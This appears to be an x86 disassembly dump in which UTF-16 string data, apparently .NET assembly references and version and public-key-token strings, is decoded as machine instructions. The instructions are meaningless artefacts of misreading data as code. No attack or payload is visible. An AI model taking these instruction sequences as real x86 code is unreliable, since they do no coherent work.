  4093c9:	add    BYTE PTR [esi+0x0],ch
  4093cc:	cmp    eax,0x37006200
  4093d1:	add    BYTE PTR [edi],dh
  4093d3:	add    BYTE PTR [ecx+0x0],ah
  4093d6:	xor    eax,0x35006300
  4093db:	add    BYTE PTR [esi],dh
  4093dd:	add    BYTE PTR [ecx],dh
  4093df:	add    BYTE PTR [ecx],bh
  4093e1:	add    BYTE PTR [ebx],dh
  4093e3:	add    BYTE PTR [eax+eax*1],dh
  4093e6:	add    BYTE PTR gs:[eax],dh
  4093e9:	add    BYTE PTR [eax],bh
  4093eb:	add    BYTE PTR [ecx],bh
  4093ed:	add    BYTE PTR [eax+0x7900539c],al
  4093f3:	add    BYTE PTR [ebx+0x0],dh
  4093f6:	je     0x4093f8
  4093f8:	add    BYTE PTR gs:[ebp+0x0],ch
  4093fc:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  409401:	add    BYTE PTR [eax+eax*1+0x61],dh
  409405:	add    BYTE PTR [eax+eax*1],ch
  409408:	and    BYTE PTR [eax],al
  40940a:	push   esi
  40940b:	add    BYTE PTR [ebp+0x0],ah
  40940e:	jb     0x409410
  409410:	jae    0x409412
  409412:	imul   eax,DWORD PTR [eax],0x6e006f
  409418:	cmp    eax,0x2e003200
  40941d:	add    BYTE PTR [eax],dh
  40941f:	add    BYTE PTR [esi],ch
  409421:	add    BYTE PTR [eax],dh
  409423:	add    BYTE PTR [esi],ch
  409425:	add    BYTE PTR [eax],dh
  409427:	add    BYTE PTR [eax+eax*1],ch
  40942a:	and    BYTE PTR [eax],al
  40942c:	inc    ebx
  40942d:	add    BYTE PTR [ebp+0x0],dh
  409430:	ins    BYTE PTR es:[edi],dx
  409431:	add    BYTE PTR [eax+eax*1+0x75],dh
  409435:	add    BYTE PTR [edx+0x0],dh
  409438:	add    BYTE PTR gs:0x65006e00,bh
  40943f:	add    BYTE PTR [ebp+0x0],dh
  409442:	je     0x409444
  409444:	jb     0x409446
  409446:	popa   
  409447:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40944b:	add    BYTE PTR [eax],ah
  40944d:	add    BYTE PTR [eax+0x0],dl
  409450:	jne    0x409452
  409452:	bound  eax,QWORD PTR [eax]
  409454:	ins    BYTE PTR es:[edi],dx
  409455:	add    BYTE PTR [ecx+0x0],ch
  409458:	arpl   WORD PTR [eax],ax
  40945a:	dec    ebx
  40945b:	add    BYTE PTR [ebp+0x0],ah
  40945e:	jns    0x409460
  409460:	push   esp
  409461:	add    BYTE PTR [edi+0x0],ch
  409464:	imul   eax,DWORD PTR [eax],0x65
  409467:	add    BYTE PTR [esi+0x0],ch
  40946a:	cmp    eax,0x37006200
  40946f:	add    BYTE PTR [edi],dh
  409471:	add    BYTE PTR [ecx+0x0],ah
  409474:	xor    eax,0x35006300
  409479:	add    BYTE PTR [esi],dh
  40947b:	add    BYTE PTR [ecx],dh
  40947d:	add    BYTE PTR [ecx],bh
  40947f:	add    BYTE PTR [ebx],dh
  409481:	add    BYTE PTR [eax+eax*1],dh
  409484:	add    BYTE PTR gs:[eax],dh
  409487:	add    BYTE PTR [eax],bh
  409489:	add    BYTE PTR [ecx],bh
  40948b:	add    BYTE PTR [eax+0x790053b6],al
  409491:	add    BYTE PTR [ebx+0x0],dh
  409494:	je     0x409496
  409496:	add    BYTE PTR gs:[ebp+0x0],ch
  40949a:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  40949f:	add    BYTE PTR [eax+eax*1+0x61],dh
  4094a3:	add    BYTE PTR [esi],ch
  4094a5:	add    BYTE PTR [edi+0x0],cl
  4094a8:	jb     0x4094aa
  4094aa:	popa   
  4094ab:	add    BYTE PTR [ebx+0x0],ah
  4094ae:	ins    BYTE PTR es:[edi],dx
  4094af:	add    BYTE PTR [ebp+0x0],ah
  4094b2:	inc    ebx
  4094b3:	add    BYTE PTR [eax+eax*1+0x69],ch
  4094b7:	add    BYTE PTR [ebp+0x0],ah
  4094ba:	outs   dx,BYTE PTR ds:[esi]
  4094bb:	add    BYTE PTR [eax+eax*1+0x2c],dh
  4094bf:	add    BYTE PTR [eax],ah
  4094c1:	add    BYTE PTR [esi+0x0],dl
  4094c4:	add    BYTE PTR gs:[edx+0x0],dh
  4094c8:	jae    0x4094ca
  4094ca:	imul   eax,DWORD PTR [eax],0x6e006f
  4094d0:	cmp    eax,0x2e003200
  4094d5:	add    BYTE PTR [eax],dh
  4094d7:	add    BYTE PTR [esi],ch
  4094d9:	add    BYTE PTR [eax],dh
  4094db:	add    BYTE PTR [esi],ch
  4094dd:	add    BYTE PTR [eax],dh
  4094df:	add    BYTE PTR [eax+eax*1],ch
  4094e2:	and    BYTE PTR [eax],al
  4094e4:	inc    ebx
  4094e5:	add    BYTE PTR [ebp+0x0],dh
  4094e8:	ins    BYTE PTR es:[edi],dx
  4094e9:	add    BYTE PTR [eax+eax*1+0x75],dh
  4094ed:	add    BYTE PTR [edx+0x0],dh
  4094f0:	add    BYTE PTR gs:0x65006e00,bh
  4094f7:	add    BYTE PTR [ebp+0x0],dh
  4094fa:	je     0x4094fc
  4094fc:	jb     0x4094fe
  4094fe:	popa   
  4094ff:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409503:	add    BYTE PTR [eax],ah
  409505:	add    BYTE PTR [eax+0x0],dl
  409508:	jne    0x40950a
  40950a:	bound  eax,QWORD PTR [eax]
  40950c:	ins    BYTE PTR es:[edi],dx
  40950d:	add    BYTE PTR [ecx+0x0],ch
  409510:	arpl   WORD PTR [eax],ax
  409512:	dec    ebx
  409513:	add    BYTE PTR [ebp+0x0],ah
  409516:	jns    0x409518
  409518:	push   esp
  409519:	add    BYTE PTR [edi+0x0],ch
  40951c:	imul   eax,DWORD PTR [eax],0x65
  40951f:	add    BYTE PTR [esi+0x0],ch
  409522:	cmp    eax,0x37006200
  409527:	add    BYTE PTR [edi],dh
  409529:	add    BYTE PTR [ecx+0x0],ah
  40952c:	xor    eax,0x35006300
  409531:	add    BYTE PTR [esi],dh
  409533:	add    BYTE PTR [ecx],dh
  409535:	add    BYTE PTR [ecx],bh
  409537:	add    BYTE PTR [ebx],dh
  409539:	add    BYTE PTR [eax+eax*1],dh
  40953c:	add    BYTE PTR gs:[eax],dh
  40953f:	add    BYTE PTR [eax],bh
  409541:	add    BYTE PTR [ecx],bh
  409543:	add    BYTE PTR [eax+0x79005392],al
  409549:	add    BYTE PTR [ebx+0x0],dh
  40954c:	je     0x40954e
  40954e:	add    BYTE PTR gs:[ebp+0x0],ch
  409552:	sub    al,0x0
  409554:	and    BYTE PTR [eax],al
  409556:	push   esi
  409557:	add    BYTE PTR [ebp+0x0],ah
  40955a:	jb     0x40955c
  40955c:	jae    0x40955e
  40955e:	imul   eax,DWORD PTR [eax],0x6e006f
  409564:	cmp    eax,0x2e003200
  409569:	add    BYTE PTR [eax],dh
  40956b:	add    BYTE PTR [esi],ch
  40956d:	add    BYTE PTR [eax],dh
  40956f:	add    BYTE PTR [esi],ch
  409571:	add    BYTE PTR [eax],dh
  409573:	add    BYTE PTR [eax+eax*1],ch
  409576:	and    BYTE PTR [eax],al
  409578:	inc    ebx
  409579:	add    BYTE PTR [ebp+0x0],dh
  40957c:	ins    BYTE PTR es:[edi],dx
  40957d:	add    BYTE PTR [eax+eax*1+0x75],dh
  409581:	add    BYTE PTR [edx+0x0],dh
  409584:	add    BYTE PTR gs:0x65006e00,bh
  40958b:	add    BYTE PTR [ebp+0x0],dh
  40958e:	je     0x409590
  409590:	jb     0x409592
  409592:	popa   
  409593:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409597:	add    BYTE PTR [eax],ah
  409599:	add    BYTE PTR [eax+0x0],dl
  40959c:	jne    0x40959e
  40959e:	bound  eax,QWORD PTR [eax]
  4095a0:	ins    BYTE PTR es:[edi],dx
  4095a1:	add    BYTE PTR [ecx+0x0],ch
  4095a4:	arpl   WORD PTR [eax],ax
  4095a6:	dec    ebx
  4095a7:	add    BYTE PTR [ebp+0x0],ah
  4095aa:	jns    0x4095ac
  4095ac:	push   esp
  4095ad:	add    BYTE PTR [edi+0x0],ch
  4095b0:	imul   eax,DWORD PTR [eax],0x65
  4095b3:	add    BYTE PTR [esi+0x0],ch
  4095b6:	cmp    eax,0x37006200
  4095bb:	add    BYTE PTR [edi],dh
  4095bd:	add    BYTE PTR [ecx+0x0],ah
  4095c0:	xor    eax,0x35006300
  4095c5:	add    BYTE PTR [esi],dh
  4095c7:	add    BYTE PTR [ecx],dh
  4095c9:	add    BYTE PTR [ecx],bh
  4095cb:	add    BYTE PTR [ebx],dh
  4095cd:	add    BYTE PTR [eax+eax*1],dh
  4095d0:	add    BYTE PTR gs:[eax],dh
  4095d3:	add    BYTE PTR [eax],bh
  4095d5:	add    BYTE PTR [ecx],bh
  4095d7:	add    BYTE PTR [eax+0x790053b4],al
  4095dd:	add    BYTE PTR [ebx+0x0],dh
  4095e0:	je     0x4095e2
  4095e2:	add    BYTE PTR gs:[ebp+0x0],ch
  4095e6:	add    BYTE PTR cs:[edx+0x0],dl
  4095ea:	jne    0x4095ec
  4095ec:	outs   dx,BYTE PTR ds:[esi]
  4095ed:	add    BYTE PTR [eax+eax*1+0x69],dh
  4095f1:	add    BYTE PTR [ebp+0x0],ch
  4095f4:	add    BYTE PTR gs:[esi],ch
  4095f7:	add    BYTE PTR [edx+0x0],dl
  4095fa:	add    BYTE PTR gs:[ebp+0x0],ch
  4095fe:	outs   dx,DWORD PTR ds:[esi]
  4095ff:	add    BYTE PTR [eax+eax*1+0x69],dh
  409603:	add    BYTE PTR [esi+0x0],ch
  409606:	add    BYTE PTR [si],ch
  409609:	add    BYTE PTR [eax],ah
  40960b:	add    BYTE PTR [esi+0x0],dl
  40960e:	add    BYTE PTR gs:[edx+0x0],dh
  409612:	jae    0x409614
  409614:	imul   eax,DWORD PTR [eax],0x6e006f
  40961a:	cmp    eax,0x2e003200
  40961f:	add    BYTE PTR [eax],dh
  409621:	add    BYTE PTR [esi],ch
  409623:	add    BYTE PTR [eax],dh
  409625:	add    BYTE PTR [esi],ch
  409627:	add    BYTE PTR [eax],dh
  409629:	add    BYTE PTR [eax+eax*1],ch
  40962c:	and    BYTE PTR [eax],al
  40962e:	inc    ebx
  40962f:	add    BYTE PTR [ebp+0x0],dh
  409632:	ins    BYTE PTR es:[edi],dx
  409633:	add    BYTE PTR [eax+eax*1+0x75],dh
  409637:	add    BYTE PTR [edx+0x0],dh
  40963a:	add    BYTE PTR gs:0x65006e00,bh
  409641:	add    BYTE PTR [ebp+0x0],dh
  409644:	je     0x409646
  409646:	jb     0x409648
  409648:	popa   
  409649:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40964d:	add    BYTE PTR [eax],ah
  40964f:	add    BYTE PTR [eax+0x0],dl
  409652:	jne    0x409654
  409654:	bound  eax,QWORD PTR [eax]
  409656:	ins    BYTE PTR es:[edi],dx
  409657:	add    BYTE PTR [ecx+0x0],ch
  40965a:	arpl   WORD PTR [eax],ax
  40965c:	dec    ebx
  40965d:	add    BYTE PTR [ebp+0x0],ah
  409660:	jns    0x409662
  409662:	push   esp
  409663:	add    BYTE PTR [edi+0x0],ch
  409666:	imul   eax,DWORD PTR [eax],0x65
  409669:	add    BYTE PTR [esi+0x0],ch
  40966c:	cmp    eax,0x37006200
  409671:	add    BYTE PTR [edi],dh
  409673:	add    BYTE PTR [ecx+0x0],ah
  409676:	xor    eax,0x35006300
  40967b:	add    BYTE PTR [esi],dh
  40967d:	add    BYTE PTR [ecx],dh
  40967f:	add    BYTE PTR [ecx],bh
  409681:	add    BYTE PTR [ebx],dh
  409683:	add    BYTE PTR [eax+eax*1],dh
  409686:	add    BYTE PTR gs:[eax],dh
  409689:	add    BYTE PTR [eax],bh
  40968b:	add    BYTE PTR [ecx],bh
  40968d:	add    BYTE PTR [eax+0x790053ae],al
  409693:	add    BYTE PTR [ebx+0x0],dh
  409696:	je     0x409698
  409698:	add    BYTE PTR gs:[ebp+0x0],ch
  40969c:	add    BYTE PTR cs:[edi+0x0],dl
  4096a0:	imul   eax,DWORD PTR [eax],0x64006e
  4096a6:	outs   dx,DWORD PTR ds:[esi]
  4096a7:	add    BYTE PTR [edi+0x0],dh
  4096aa:	jae    0x4096ac
  4096ac:	add    BYTE PTR cs:[esi+0x0],al
  4096b0:	outs   dx,DWORD PTR ds:[esi]
  4096b1:	add    BYTE PTR [edx+0x0],dh
  4096b4:	ins    DWORD PTR es:[edi],dx
  4096b5:	add    BYTE PTR [ebx+0x0],dh
  4096b8:	sub    al,0x0
  4096ba:	and    BYTE PTR [eax],al
  4096bc:	push   esi
  4096bd:	add    BYTE PTR [ebp+0x0],ah
  4096c0:	jb     0x4096c2
  4096c2:	jae    0x4096c4
  4096c4:	imul   eax,DWORD PTR [eax],0x6e006f
  4096ca:	cmp    eax,0x2e003200
  4096cf:	add    BYTE PTR [eax],dh
  4096d1:	add    BYTE PTR [esi],ch
  4096d3:	add    BYTE PTR [eax],dh
  4096d5:	add    BYTE PTR [esi],ch
  4096d7:	add    BYTE PTR [eax],dh
  4096d9:	add    BYTE PTR [eax+eax*1],ch
  4096dc:	and    BYTE PTR [eax],al
  4096de:	inc    ebx
  4096df:	add    BYTE PTR [ebp+0x0],dh
  4096e2:	ins    BYTE PTR es:[edi],dx
  4096e3:	add    BYTE PTR [eax+eax*1+0x75],dh
  4096e7:	add    BYTE PTR [edx+0x0],dh
  4096ea:	add    BYTE PTR gs:0x65006e00,bh
  4096f1:	add    BYTE PTR [ebp+0x0],dh
  4096f4:	je     0x4096f6
  4096f6:	jb     0x4096f8
  4096f8:	popa   
  4096f9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4096fd:	add    BYTE PTR [eax],ah
  4096ff:	add    BYTE PTR [eax+0x0],dl
  409702:	jne    0x409704
  409704:	bound  eax,QWORD PTR [eax]
  409706:	ins    BYTE PTR es:[edi],dx
  409707:	add    BYTE PTR [ecx+0x0],ch
  40970a:	arpl   WORD PTR [eax],ax
  40970c:	dec    ebx
  40970d:	add    BYTE PTR [ebp+0x0],ah
  409710:	jns    0x409712
  409712:	push   esp
  409713:	add    BYTE PTR [edi+0x0],ch
  409716:	imul   eax,DWORD PTR [eax],0x65
  409719:	add    BYTE PTR [esi+0x0],ch
  40971c:	cmp    eax,0x37006200
  409721:	add    BYTE PTR [edi],dh
  409723:	add    BYTE PTR [ecx+0x0],ah
  409726:	xor    eax,0x35006300
  40972b:	add    BYTE PTR [esi],dh
  40972d:	add    BYTE PTR [ecx],dh
  40972f:	add    BYTE PTR [ecx],bh
  409731:	add    BYTE PTR [ebx],dh
  409733:	add    BYTE PTR [eax+eax*1],dh
  409736:	add    BYTE PTR gs:[eax],dh
  409739:	add    BYTE PTR [eax],bh
  40973b:	add    BYTE PTR [ecx],bh
  40973d:	add    BYTE PTR [eax+0x7900539a],al
  409743:	add    BYTE PTR [ebx+0x0],dh
  409746:	je     0x409748
  409748:	add    BYTE PTR gs:[ebp+0x0],ch
  40974c:	add    BYTE PTR cs:[eax+0x0],bl
  409750:	ins    DWORD PTR es:[edi],dx
  409751:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409755:	add    BYTE PTR [eax],ah
  409757:	add    BYTE PTR [esi+0x0],dl
  40975a:	add    BYTE PTR gs:[edx+0x0],dh
  40975e:	jae    0x409760
  409760:	imul   eax,DWORD PTR [eax],0x6e006f
  409766:	cmp    eax,0x2e003200
  40976b:	add    BYTE PTR [eax],dh
  40976d:	add    BYTE PTR [esi],ch
  40976f:	add    BYTE PTR [eax],dh
  409771:	add    BYTE PTR [esi],ch
  409773:	add    BYTE PTR [eax],dh
  409775:	add    BYTE PTR [eax+eax*1],ch
  409778:	and    BYTE PTR [eax],al
  40977a:	inc    ebx
  40977b:	add    BYTE PTR [ebp+0x0],dh
  40977e:	ins    BYTE PTR es:[edi],dx
  40977f:	add    BYTE PTR [eax+eax*1+0x75],dh
  409783:	add    BYTE PTR [edx+0x0],dh
  409786:	add    BYTE PTR gs:0x65006e00,bh
  40978d:	add    BYTE PTR [ebp+0x0],dh
  409790:	je     0x409792
  409792:	jb     0x409794
  409794:	popa   
  409795:	add    BYTE PTR [eax+eax*1+0x2c],ch
  409799:	add    BYTE PTR [eax],ah
  40979b:	add    BYTE PTR [eax+0x0],dl
  40979e:	jne    0x4097a0
  4097a0:	bound  eax,QWORD PTR [eax]
  4097a2:	ins    BYTE PTR es:[edi],dx
  4097a3:	add    BYTE PTR [ecx+0x0],ch
  4097a6:	arpl   WORD PTR [eax],ax
  4097a8:	dec    ebx
  4097a9:	add    BYTE PTR [ebp+0x0],ah
  4097ac:	jns    0x4097ae
  4097ae:	push   esp
  4097af:	add    BYTE PTR [edi+0x0],ch
  4097b2:	imul   eax,DWORD PTR [eax],0x65
  4097b5:	add    BYTE PTR [esi+0x0],ch
  4097b8:	cmp    eax,0x37006200
  4097bd:	add    BYTE PTR [edi],dh
  4097bf:	add    BYTE PTR [ecx+0x0],ah
  4097c2:	xor    eax,0x35006300
  4097c7:	add    BYTE PTR [esi],dh
  4097c9:	add    BYTE PTR [ecx],dh
  4097cb:	add    BYTE PTR [ecx],bh
  4097cd:	add    BYTE PTR [ebx],dh
  4097cf:	add    BYTE PTR [eax+eax*1],dh
  4097d2:	add    BYTE PTR gs:[eax],dh
  4097d5:	add    BYTE PTR [eax],bh
  4097d7:	add    BYTE PTR [ecx],bh
  4097d9:	add    BYTE PTR [eax],ah
  4097db:	bound  eax,QWORD PTR [eax]
  4097dd:	xor    BYTE PTR [eax],al
  4097df:	xor    eax,DWORD PTR [eax]
  4097e1:	data16 add BYTE PTR ds:0x37006600,dh
  4097e8:	add    BYTE PTR [esi+0x0],ah
  4097eb:	xor    DWORD PTR [eax],eax
  4097ed:	xor    DWORD PTR [eax],eax
  4097ef:	add    BYTE PTR fs:0x61003000,dh
  4097f6:	add    BYTE PTR [ebx],dh
  4097f8:	add    BYTE PTR [ecx+0x0],ah
  4097fb:	add    BYTE PTR [eax+0x300030],0x32
  409802:	add    BYTE PTR [eax+eax*1],dh
  409805:	xor    BYTE PTR [eax],al
  409807:	xor    BYTE PTR [eax],al
  409809:	xor    BYTE PTR [eax],al
  40980b:	xor    BYTE PTR [eax],al
  40980d:	xor    BYTE PTR [eax],al
  40980f:	xor    al,0x0
  409811:	cmp    BYTE PTR [eax],al
  409813:	xor    BYTE PTR [eax],al
  409815:	xor    BYTE PTR [eax],al
  409817:	xor    BYTE PTR [eax],al
  409819:	xor    BYTE PTR [eax],al
  40981b:	xor    BYTE PTR [eax],al
  40981d:	cmp    DWORD PTR [eax],eax
  40981f:	xor    al,0x0
  409821:	xor    BYTE PTR [eax],al
  409823:	xor    BYTE PTR [eax],al
  409825:	xor    BYTE PTR [eax],al
  409827:	xor    BYTE PTR [eax],al
  409829:	xor    BYTE PTR [eax],al
  40982b:	xor    BYTE PTR [eax],al
  40982d:	xor    BYTE PTR [eax],al
  40982f:	add    BYTE PTR ss:[eax],dh
  409832:	add    BYTE PTR [edx],dh
  409834:	add    BYTE PTR [eax],dh
  409836:	add    BYTE PTR [eax],dh
  409838:	add    BYTE PTR [eax],dh
  40983a:	add    BYTE PTR [eax],dh
  40983c:	add    BYTE PTR [eax],dh
  40983e:	add    BYTE PTR [eax],dh
  409840:	add    BYTE PTR [edx],dh
  409842:	add    BYTE PTR [eax+eax*1],dh
  409845:	xor    BYTE PTR [eax],al
  409847:	xor    BYTE PTR [eax],al
  409849:	xor    BYTE PTR [eax],al
  40984b:	xor    BYTE PTR [eax],al
  40984d:	xor    eax,0x35003200
  409852:	add    BYTE PTR [ebx],dh
  409854:	add    BYTE PTR [eax+eax*1],dh
  409857:	xor    DWORD PTR [eax],eax
  409859:	xor    eax,DWORD PTR [eax]
  40985b:	xor    DWORD PTR [eax],eax
  40985d:	xor    BYTE PTR [eax],al
  40985f:	xor    BYTE PTR [eax],al
  409861:	xor    BYTE PTR [eax],al
  409863:	xor    al,0x0
  409865:	xor    BYTE PTR [eax],al
  409867:	xor    BYTE PTR [eax],al
  409869:	xor    BYTE PTR [eax],al
  40986b:	xor    BYTE PTR [eax],al
  40986d:	xor    BYTE PTR [eax],al
  40986f:	xor    DWORD PTR [eax],eax
  409871:	xor    BYTE PTR [eax],al
  409873:	xor    BYTE PTR [eax],al
  409875:	xor    BYTE PTR [eax],al
  409877:	xor    DWORD PTR [eax],eax
  409879:	xor    BYTE PTR [eax],al
  40987b:	xor    BYTE PTR [eax],al
  40987d:	xor    BYTE PTR [eax],al
  40987f:	aaa    
  409880:	add    BYTE PTR [eax+eax*1+0x31],al
  409884:	add    BYTE PTR [esi+0x0],al
  409887:	inc    ecx
  409888:	add    BYTE PTR ds:0x43003700,dh
  40988e:	add    BYTE PTR [eax+eax*1],dh
  409891:	inc    ecx
  409892:	add    BYTE PTR [ebp+0x0],al
  409895:	inc    esp
  409896:	add    BYTE PTR [ecx],bh
  409898:	add    BYTE PTR [esi+0x0],al
  40989b:	xor    BYTE PTR [eax],al
  40989d:	inc    ecx
  40989e:	add    BYTE PTR [ebx],dh
  4098a0:	add    BYTE PTR [edx],dh
  4098a2:	add    BYTE PTR [ebp+0x0],al
  4098a5:	cmp    BYTE PTR [eax],al
  4098a7:	xor    al,0x0
  4098a9:	inc    ecx
  4098aa:	add    BYTE PTR [ecx+0x0],al
  4098ad:	xor    BYTE PTR [eax],al
  4098af:	inc    esi
  4098b0:	add    BYTE PTR [ecx+0x0],al
  4098b3:	inc    ebp
  4098b4:	add    BYTE PTR [esi+0x0],al
  4098b7:	inc    esp
  4098b8:	add    BYTE PTR [eax],dh
  4098ba:	add    BYTE PTR [eax+eax*1+0x45],al
  4098be:	add    BYTE PTR [ecx],bh
  4098c0:	add    BYTE PTR [ebp+0x0],al
  4098c3:	cmp    BYTE PTR [eax],al
  4098c5:	inc    esi
  4098c6:	add    BYTE PTR [eax+eax*1+0x36],al
  4098ca:	add    BYTE PTR [ecx+0x0],al
  4098cd:	inc    ebp
  4098ce:	add    BYTE PTR [ebx+0x0],al
  4098d1:	cmp    BYTE PTR [eax],al
  4098d3:	inc    esi
  4098d4:	add    BYTE PTR [eax],bh
  4098d6:	add    BYTE PTR [edi],dh
  4098d8:	add    BYTE PTR [esi+0x0],al
  4098db:	inc    edx
  4098dc:	add    BYTE PTR [eax],dh
  4098de:	add    BYTE PTR [ebx],dh
  4098e0:	add    BYTE PTR [edi],dh
  4098e2:	add    BYTE PTR [esi],dh
  4098e4:	add    BYTE PTR [esi],dh
  4098e6:	add    BYTE PTR [ebx+0x0],al
  4098e9:	cmp    BYTE PTR [eax],al
  4098eb:	xor    eax,DWORD PTR [eax]
  4098ed:	xor    al,0x0
  4098ef:	inc    ebx
  4098f0:	add    BYTE PTR [ecx],bh
  4098f2:	add    BYTE PTR [ecx],bh
  4098f4:	add    BYTE PTR [ecx],bh
  4098f6:	add    BYTE PTR [edx],dh
  4098f8:	add    BYTE PTR [ecx],dh
  4098fa:	add    BYTE PTR [ebp+0x0],al
  4098fd:	inc    edx
  4098fe:	add    BYTE PTR [edx],dh
  409900:	add    BYTE PTR [ebx],dh
  409902:	add    BYTE PTR [edx+0x0],al
  409905:	inc    ebp
  409906:	add    BYTE PTR [edi],dh
  409908:	add    BYTE PTR [ecx],bh
  40990a:	add    BYTE PTR [ecx+0x0],al
  40990d:	inc    esp
  40990e:	add    BYTE PTR [ecx],bh
  409910:	add    BYTE PTR [eax+eax*1+0x35],al
  409914:	add    BYTE PTR [eax+eax*1+0x43],al
  409918:	add    BYTE PTR [ebx+0x0],al
  40991b:	xor    DWORD PTR [eax],eax
  40991d:	inc    esp
  40991e:	add    BYTE PTR [eax+eax*1+0x39],al
  409922:	add    BYTE PTR [ecx+0x0],al
  409925:	inc    esp
  409926:	add    BYTE PTR [edx],dh
  409928:	add    BYTE PTR [ebx],dh
  40992a:	add    BYTE PTR [esi],dh
  40992c:	add    BYTE PTR [ecx],dh
  40992e:	add    BYTE PTR [ebx],dh
  409930:	add    BYTE PTR [edx],dh
  409932:	add    BYTE PTR [ecx],dh
  409934:	add    BYTE PTR [eax],dh
  409936:	add    BYTE PTR [edx],dh
  409938:	add    BYTE PTR [ecx],bh
  40993a:	add    BYTE PTR [eax],dh
  40993c:	add    BYTE PTR [eax],dh
  40993e:	add    BYTE PTR [edx+0x0],al
  409941:	aaa    
  409942:	add    BYTE PTR [edx],dh
  409944:	add    BYTE PTR [ebx],dh
  409946:	add    BYTE PTR [ebx+0x0],al
  409949:	inc    esi
  40994a:	add    BYTE PTR [ecx],bh
  40994c:	add    BYTE PTR [eax],bh
  40994e:	add    BYTE PTR [eax],dh
  409950:	add    BYTE PTR [ecx],bh
  409952:	add    BYTE PTR ds:0x46003700,dh
  409958:	add    BYTE PTR [ebx+0x0],al
  40995b:	xor    al,0x0
  40995d:	inc    ebp
  40995e:	add    BYTE PTR [ecx],dh
  409960:	add    BYTE PTR [edi],dh
  409962:	add    BYTE PTR [edi],dh
  409964:	add    BYTE PTR [ecx],dh
  409966:	add    BYTE PTR [eax],dh
  409968:	add    BYTE PTR [eax],bh
  40996a:	add    BYTE PTR [esi+0x0],al
  40996d:	inc    ebx
  40996e:	add    BYTE PTR [esi],dh
  409970:	add    BYTE PTR [eax],dh
  409972:	add    BYTE PTR [edi],dh
  409974:	add    BYTE PTR [edi],dh
  409976:	add    BYTE PTR [edi],dh
  409978:	add    BYTE PTR [eax+eax*1],dh
  40997b:	inc    esi
  40997c:	add    BYTE PTR [edx],dh
  40997e:	add    BYTE PTR [ecx],bh
  409980:	add    BYTE PTR [ebp+0x0],al
  409983:	cmp    BYTE PTR [eax],al
  409985:	xor    eax,DWORD PTR [eax]
  409987:	xor    al,BYTE PTR [eax]
  409989:	xor    BYTE PTR [eax],al
  40998b:	inc    ebp
  40998c:	add    BYTE PTR [ecx],bh
  40998e:	add    BYTE PTR [edx],dh
  409990:	add    BYTE PTR [ebp+0x0],al
  409993:	inc    ecx
  409994:	add    BYTE PTR [eax],dh
  409996:	add    BYTE PTR ds:0x43004500,dh
  40999c:	add    BYTE PTR [ebp+0x0],al
  40999f:	xor    al,0x0
  4099a1:	inc    ebp
  4099a2:	add    BYTE PTR [eax],bh
  4099a4:	add    BYTE PTR [edx],dh
  4099a6:	add    BYTE PTR [ecx],dh
  4099a8:	add    BYTE PTR [ebx+0x0],al
  4099ab:	xor    BYTE PTR [eax],al
  4099ad:	inc    ecx
  4099ae:	add    BYTE PTR ds:0x46004500,dh
  4099b4:	add    BYTE PTR [ebp+0x0],al
  4099b7:	cmp    BYTE PTR [eax],al
  4099b9:	inc    esi
  4099ba:	add    BYTE PTR [ecx],dh
  4099bc:	add    BYTE PTR [esi],dh
  4099be:	add    BYTE PTR [eax+eax*1],dh
  4099c1:	xor    eax,0x34004300
  4099c6:	add    BYTE PTR [ebx+0x0],al
  4099c9:	xor    BYTE PTR [eax],al
  4099cb:	inc    ebx
  4099cc:	add    BYTE PTR [ecx],bh
  4099ce:	add    BYTE PTR [ebx],dh
  4099d0:	add    BYTE PTR [ebx+0x0],al
  4099d3:	xor    DWORD PTR [eax],eax
  4099d5:	inc    ecx
  4099d6:	add    BYTE PTR [edx+0x0],al
  4099d9:	cmp    DWORD PTR [eax],eax
  4099db:	cmp    DWORD PTR [eax],eax
  4099dd:	xor    al,BYTE PTR [eax]
  4099df:	cmp    BYTE PTR [eax],al
  4099e1:	xor    eax,0x36004400
  4099e6:	add    BYTE PTR [edx],dh
  4099e8:	add    BYTE PTR [edx],dh
  4099ea:	add    BYTE PTR [ebx+0x0],al
  4099ed:	inc    ecx
  4099ee:	add    BYTE PTR [ecx+0x0],al
  4099f1:	add    BYTE PTR ss:0x43003200,dh
  4099f8:	add    BYTE PTR [ecx],dh
  4099fa:	add    BYTE PTR [eax+eax*1+0x46],al
  4099fe:	add    BYTE PTR [ecx+0x0],al
  409a01:	inc    esp
  409a02:	add    BYTE PTR [esi],dh
  409a04:	add    BYTE PTR [ebx],dh
  409a06:	add    BYTE PTR [eax+eax*1+0x37],al
  409a0a:	add    BYTE PTR [eax+eax*1],dh
  409a0d:	xor    eax,0x36004400
  409a12:	add    BYTE PTR [esi+0x0],al
  409a15:	xor    al,BYTE PTR [eax]
  409a17:	inc    esp
  409a18:	add    BYTE PTR [ebp+0x0],al
  409a1b:	xor    eax,0x31004600
  409a20:	add    BYTE PTR [edi],dh
  409a22:	add    BYTE PTR [ebp+0x0],al
  409a25:	xor    eax,0x41004500
  409a2a:	add    BYTE PTR [esi+0x0],al
  409a2d:	xor    BYTE PTR [eax],al
  409a2f:	inc    esi
  409a30:	add    BYTE PTR [ebx+0x0],al
  409a33:	xor    al,0x0
  409a35:	cmp    DWORD PTR [eax],eax
  409a37:	add    BYTE PTR ss:[ebx],dh
  409a3a:	add    BYTE PTR [eax+eax*1+0x32],al
  409a3e:	add    BYTE PTR [esi],dh
  409a40:	add    BYTE PTR [ecx],dh
  409a42:	add    BYTE PTR [ebx+0x0],al
  409a45:	cmp    BYTE PTR [eax],al
  409a47:	inc    ecx
  409a48:	add    BYTE PTR [ecx],dh
  409a4a:	add    BYTE PTR [edx],dh
  409a4c:	add    BYTE PTR [eax+eax*1],dh
  409a4f:	xor    eax,DWORD PTR [eax]
  409a51:	add    BYTE PTR ss:0x38003100,dh
  409a58:	add    BYTE PTR [edx],dh
  409a5a:	add    BYTE PTR [eax],dh
  409a5c:	add    BYTE PTR [esi],dh
  409a5e:	add    BYTE PTR [eax+eax*1+0x43],al
  409a62:	add    BYTE PTR [eax],dh
  409a64:	add    BYTE PTR [ecx],bh
  409a66:	add    BYTE PTR [ebx],dh
  409a68:	add    BYTE PTR [ebx],dh
  409a6a:	add    BYTE PTR [eax+eax*1],dh
